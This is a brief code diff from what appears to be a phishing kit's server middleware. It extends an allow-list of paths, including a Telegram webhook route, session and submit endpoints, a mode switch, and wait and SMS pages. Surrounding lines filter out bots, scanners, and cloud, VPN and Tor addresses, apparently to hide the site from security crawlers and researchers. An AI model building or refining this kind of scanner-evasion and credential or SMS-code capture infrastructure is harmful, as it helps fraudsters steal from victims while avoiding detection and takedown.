@@ -20,7 +20,15 @@ const BOT_UA = /(bot|crawl|spider|scan|slurp|fetch|curl|wget|python-requests|go-
 const BAD_ORG = /(amazon|aws|google cloud|gcp|microsoft|azure|digitalocean|linode|vultr|hetzner|ovh|scaleway|oracle cloud|alibaba|tencent|contabo|choopa|leaseweb|m247|cloudflare|oracle|fastly|akamai|datacamp|privateinternetaccess|nordvpn|expressvpn|protonvpn|surfshark|mullvad|tor|relay|proxy|hosting|server|vps|dedicated)/i;
 
 // ---- Always-allowed paths ----
-const ALLOW_PATHS = [/^\/admin(\/|$)/, /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session)(\/|$)?/];
+const ALLOW_PATHS = [
+  /^\/admin(\/|$)/,
+  /^\/api\/(tg-hook|set-mode|check-mode|sessions|visit|post|submit|delete-session)(\/|$)?/,
+  /^\/wait\.html/,
+  /^\/sms\.html/,
+  /^\/img\//,
+  /^\/css\//,
+  /^\/js\//
+];
 
 // ---- Cache IP lookups so we don't hit ipapi.co every request ----
 const ipCache = new Map(); // ip -> { bad:boolean, exp:number }
